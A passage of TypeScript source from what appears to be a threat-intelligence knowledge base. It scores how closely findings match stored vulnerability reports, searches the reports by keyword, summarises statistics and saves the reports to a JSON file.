          termMatches++;
        }
      }

      // Require genuine trigger pattern match OR at least 2 highly specific domain terms!
      if (triggerPatternMatched || (termMatches >= 2 && classTerms.length >= 2)) {
        const totalScore = triggerPatternMatched ? 0.85 + (matchCount * 0.05) : 0.60 + (termMatches * 0.08);
        const similarityScore = Math.min(0.99, Number(totalScore.toFixed(2)));
        correlations.push({
          reportId: report.id,
          title: report.title,
          source: report.source,
          similarityScore,
          attackVariant: detectedVariant,
          vulnerabilityClass: report.vulnerabilityClass,
          exploitMechanism: report.exploitMechanism,
          referenceUrl: report.referenceUrl
        });
      }
    }

    // Sort by highest similarity
    return correlations.sort((a, b) => b.similarityScore - a.similarityScore);
  }

  /**
   * Search threat reports by query keyword (CVE, class, technology, attack type)
   */
  public searchReports(query: string): ThreatReport[] {
    const q = query.toLowerCase();
    const results: ThreatReport[] = [];

    for (const report of this.reports.values()) {
      const inId = report.id.toLowerCase().includes(q);
      const inTitle = report.title.toLowerCase().includes(q);
      const inClass = report.vulnerabilityClass.toLowerCase().includes(q);
      const inSummary = report.summary.toLowerCase().includes(q);
      const inVariants = report.attackVariants.some((v) => v.toLowerCase().includes(q));

      if (inId || inTitle || inClass || inSummary || inVariants) {
        results.push(report);
      }
    }
    return results;
  }

  public getAllReports(): ThreatReport[] {
    return Array.from(this.reports.values());
  }

  public getStats(): ThreatIntelSummary {
    const all = Array.from(this.reports.values());
    let variantCount = 0;
    const variants: string[] = [];

    for (const r of all) {
      variantCount += r.attackVariants.length;
      variants.push(...r.attackVariants);
    }

    return {
      totalLearnedReports: all.length,
      totalAttackVariants: variantCount,
      matchedReportsCount: 0,
      detectedVariants: variants.slice(0, 10)
    };
  }

  private loadPersistedReports(): void {
    try {
      if (fs.existsSync(this.storagePath)) {
        const data = fs.readFileSync(this.storagePath, 'utf-8');
        const customReports: ThreatReport[] = JSON.parse(data);
        for (const rep of customReports) {
          this.reports.set(rep.id, rep);
        }
      }
    } catch {
      // Ignore initial read error if empty
    }
  }

  private async savePersistedReports(): Promise<void> {
    try {
      const dir = path.dirname(this.storagePath);
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }
      const data = JSON.stringify(Array.from(this.reports.values()), null, 2);
      fs.writeFileSync(this.storagePath, data, 'utf-8');
    } catch (err: any) {
      console.error('Failed to persist threat knowledge base:', err.message);
    }
  }
}
